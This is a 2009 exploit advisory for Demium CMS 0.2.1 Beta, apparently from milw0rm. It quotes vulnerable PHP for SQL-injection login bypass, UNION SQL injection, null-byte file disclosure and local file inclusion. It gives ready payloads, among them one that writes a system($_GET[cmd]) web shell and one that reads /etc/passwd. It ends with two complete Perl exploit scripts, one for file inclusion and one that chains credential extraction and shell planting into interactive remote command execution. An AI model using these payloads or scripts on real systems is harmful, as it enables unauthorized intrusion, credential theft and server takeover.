<html><head><title>Demium CMS 0.2.1B Multiple Vulnerabilities and Exploit</title></head><pre>Demium CMS, version 0.2.1 Beta, is prone to multiple remote vulnerabilities, because of insufficient security on it. Let's see them. In this advisory
you can find vulnerabilities, afflicted source, and multiple Remote Exploit.


Credits to : Giovanni Buzzin, Osirys
Contact    : osirys[at]autistici[dot]org
Website    : http://osirys.org
Download   : http://www.demium.de/ftp/archive/demium_beta_v.0.2.1.rar


[0x01 - Authority Bypass via Sql Injection]

	At first, it's vulnerable to Authority Bypass via Sql Injection. Needs Magic Quotes OFF to work, because CMS dosn't stripslash on
	POST data.
	
	Vulnerable file is: /[path]/index_admin.php
	[CODE]
		$username = $_POST['user'];
		$pw = md5($_POST['pw']);
		$sql = &quot;SELECT * FROM cms_profile WHERE profile_username = '$username' AND profile_password = '$pw' AND profile_aktiv=1;&quot;;
		$result = mysql_query($sql);
		$failure=true;
		while($row = mysql_fetch_assoc($result))
			{
			$failure=false;
			setcookie(&quot;login_pw&quot;, $pw, (time()+(60*60*24*365)));
			setcookie(&quot;login_user&quot;, $username, (time()+(60*60*24*365)));
			header(&quot;Location: /demium_beta_v.0.2.1//index_admin.php?loading=1&quot;);
			}
		}
	[/CODE]

	To exploit this vulnerability, and become Administrator, just put this in username form: admin_user' or '1=1
	Where admin_user is the real nickname of the Administrator, by default: admin.

[/0x01]

[0x02 - Remote SQL Injection]

	Multiple SQL Injection vulnerabilities found on this CMS. I just report the first one that I found. Needs Magic Quotes needs to be OFF
        because this CMS doesn't stripslash on GET incoming data.

	Vulnerable file is: /[path]/tracking.php
	[CODE]

		&lt;?php
		### Kat-Tracking ###
		$follow=$_GET['follow_kat'];
		$check=FALSE;
		include('config/db_file.php');
		include('logging/tracking.php');

		$sql=&quot;SELECT tracking_kat_target FROM cms_tracking_kat WHERE tracking_kat_id='$follow';&quot;;
		$result=mysql_query($sql);
		while($row=mysql_fetch_assoc($result))
			{
			$check=TRUE;
		// code
		if($check==TRUE)
			{
			?&gt;
			&lt;script language=&quot;javascript&quot;&gt;
				window.setTimeout(&quot;location.replace('&lt;?php echo $target; ?&gt;')&quot;,&quot;0&quot;);
			&lt;/script&gt;
			&lt;?php
			}

	[/CODE]

	$follow comes directly from GET, and it's put in the SQL query without been sanized or filtered. If the SQL query is TRUE, rows will
	be printed on the url.

	Exploit to obtain admin's password: /[path]/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*
	Exploit to create a shell:          /[path]/tracking.php?follow_kat=osirys' union select '&lt;?php system($_GET[cmd]); ?&gt;' into outfile '/tmp/sh_spawn_ownz.txt

	Exploit #1 will produce a GET request to a non existing file, since after the exploit the remote user will be redirected to host/sql_output/.html
	Testing this SQL Injection in local I got redirected to this URL: http://localhost/admin:5f4dcc3b5aa765d61d8327deb882cf99/.html , producing the classic:
	The requested URL /admin:5f4dcc3b5aa765d61d8327deb882cf99/.html was not found on this server.

	Exploit #2 just create a file called &quot;sh_spawn_ownz.txt&quot; with &quot;&lt;?php system($_GET[cmd]); ?&gt;&quot; as content, yes, a Remote Shell. With LFI vulnerability the remote user will
	be able to include the created file and executes command.

	Exploit provided at the end of the adviosory.


[/0x02]

[0x03 - Remote File Disclosure]

	It's also vulnerable to File Disclore, with a GET request a remote user is able to read files content. It's not a file inclusion, but a fread
	of a local file. Let's see the vulnerable code.

	Vulnerable file is: /[path]/urheber.php
	[CODE]
		&lt;?php
		$fname=$_GET['name'];
		if($handle = @fopen(&quot;template/&quot;.$fname.&quot;/agb.cff&quot;, &quot;r&quot;))
			{
			$contents = fread ($handle, filesize (&quot;template/&quot;.$fname.&quot;/agb.cff&quot;));
			$contents = str_replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;, $contents);
			echo $contents;
			}
		// Other code
	[/CODE]

	$fname comes directly from GET, without been cheeked before. From get we can se it's value, and adding a NULL BYTE %00 a remote user will
	be able to read the content of the selected file.
	Attach example: /[path]/urheber.php?name=../content.php%00
        This request will show /[path]/content.php source code.
        Attach example #2 : /[path]/urheber.php?name=../../../../../../../../../../etc/passwd%00

[/0x03]

[0x04 - Local File Inclusion]

	This CMS, it's also affected to Local File Inclusion, a remote user will able to include and execute local file on the server.
	I coded then a simple exploit to obtain a Remote Command Execution, creating a malicious file on the server, to include it then with the LFI.

	Vulnerable file is: /[path]/content.php
	[CODE]
		&lt;?php
		include('config/db_file.php');
		include('config/rights.php');
		$include = &quot;overview&quot;;
		if($_GET['include'])
			$include = $_GET['include'];
		if($_COOKIE['login_user'] &amp;&amp; $_COOKIE['login_pw'])
		@include('modules/'.$include.'.php');
		?&gt;
	[/CODE]

	In case of remote user's user and password cookies, the script will include GET data, simple Perl sploit at the end of the advisory.

[/0x04]



#########
Exploits section now.
####


[$$ - Local File Inclusion Exploit]

#!/usr/bin/perl

# LFI Sploit
# by Osirys

use IO::Socket;

my $host   = $ARGV[0];

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&amp;exploit;

sub exploit () {
    print &quot;\n[*] Include: &quot;;
    chomp($l_file = &lt;STDIN&gt;);

    print &quot;\n&quot;;
    $l_file !~ /exit/ || die &quot;Exiting ..&quot;;
    if ($l_file !~ /%00^/) {
        $l_file = $l_file.&quot;%00&quot;;
    }

    my $url = $path.&quot;/content.php?include=&quot;.$l_file;

    my $data = &quot;GET &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Cookie: login_user=p0wnin; login_pw=p0wnin\r\n&quot;.
               &quot;Content-Length: 0\r\n\r\n&quot;.
               &quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                             PeerAddr =&gt; $h0st,
                                             PeerPort =&gt; '80',
                                             Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    $socket-&gt;send($data);

    my $count = 0;
    while (my $e = &lt;$socket&gt;) {
        $count++;
        if ($count &gt; 9) {
            chomp($e);
            print &quot;$e\n&quot;;
        }
    }

    &amp;exploit;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.+)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------- \n&quot;.
          &quot;     Demium CMS LFI sploit    \n&quot;.
          &quot;           by Osirys          \n&quot;.
          &quot;  --------------------------- \n\n&quot;;
}

sub help () {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

[/$$]







[$$$ - Remote Command Execution Exploit via SQL Injection and Local File Inclusion (Works with mq Off)]

#!/usr/bin/perl

# RCE Exploit
# Step 1 =&gt; Creating a remote Shell in /tmp via SQL Injection
# Step 2 =&gt; Including via LFI remote Shell, executing your CMDs

# by Giovanni Buzzin, Osirys

# ----------------------------------------------------------------------------
# Exploit in action [&gt;!]
# ----------------------------------------------------------------------------
# osirys[~]&gt;$ perl sp1.txt http://localhost/demium_beta_v.0.2.1/

#   ---------------------------
#      Demium CMS RCE sploit
#            (SQL-LFI)
#            by Osirys
#   ---------------------------

# [*] Getting admin login details ..
# [$] User: admin
# [$] Pass: 5f4dcc3b5aa765d61d8327deb882cf99

# [*] Creating remote Shell via SQL Injection ..
# [*] Spawning remote Shell via LFI ..

# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/demium_beta_v.0.2.1
# shell[localhost]$&gt; exit
# [-] Quitting ..

# osirys[~]&gt;$
# ----------------------------------------------------------------------------

use IO::Socket;
use LWP::UserAgent;

my $host   = $ARGV[0];
my $rand = int(rand 50);

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print &quot;[*] Getting admin login details ..\n&quot;;

my $url = $host.&quot;/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*&quot;;
my $re = get_req($url);
if ($re =~ /replace\('\/(.+):(.+)\/.html/) {
    $user = $1;
    $pass = $2;
    print &quot;[\$] User: $user\n&quot;;
    print &quot;[\$] Pass: $pass\n&quot;;
}
else {
    print &quot;[-] Can't extract admin details\n\n&quot;;
}

print &quot;\n[*] Creating remote Shell via SQL Injection ..\n&quot;;

my $code = &quot;&lt;?php echo \&quot;0xExec\&quot;;system(\$_GET[cmd]);echo \&quot;ExeCx0\&quot; ?&gt;&quot;;
my $file = &quot;/tmp/sh_spawn_ownzzzzz&quot;.$rand.&quot;.txt&quot;;
my $attack  = $host.&quot;/tracking.php?follow_kat=osirys' union select '&quot;.$code.&quot;' into outfile '&quot;.$file;
get_req($attack);

print &quot;[*] Spawning remote Shell via LFI ..\n\n&quot;;
&amp;exploit;

sub exploit {
    my $file = &quot;../../../../../../../../..&quot;.$file;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    chomp($cmd = &lt;STDIN&gt;);
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n\n&quot;;

    my $url = $path.&quot;/content.php?include=&quot;.$file.&quot;%00&amp;cmd=&quot;.$cmd;

    my $data = &quot;GET &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Cookie: login_user=p0wnin; login_pw=p0wnin\r\n&quot;.
               &quot;Content-Length: 0\r\n\r\n&quot;.
               &quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                             PeerAddr =&gt; $h0st,
                                             PeerPort =&gt; '80',
                                             Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    $socket-&gt;send($data);

    my @tmp_out;
    my $stop;
    while ((my $e = &lt;$socket&gt;)&amp;&amp;($stop != 1)) {
        if ($e =~ /ExeCx0/) {
            $stop = 1;
        }
        push(@tmp_out,$e);
    }

    $stop == 1 || die &quot;[-] Can't include remote Shell\n\n&quot;;

    my $re = join '', @tmp_out;
    my $content = tag($re);
    if ($content =~ /0xExec(.+)\*ExeCx0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print &quot;$out\n&quot;;
        &amp;exploit;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exploit;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return($response-&gt;content);
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.+)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return($full_det);
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------- \n&quot;.
          &quot;     Demium CMS RCE sploit    \n&quot;.
          &quot;           (SQL-LFI)          \n&quot;.
          &quot;           by Osirys          \n&quot;.
          &quot;  --------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

[/$$$]

# milw0rm.com [2009-02-27]</pre></html>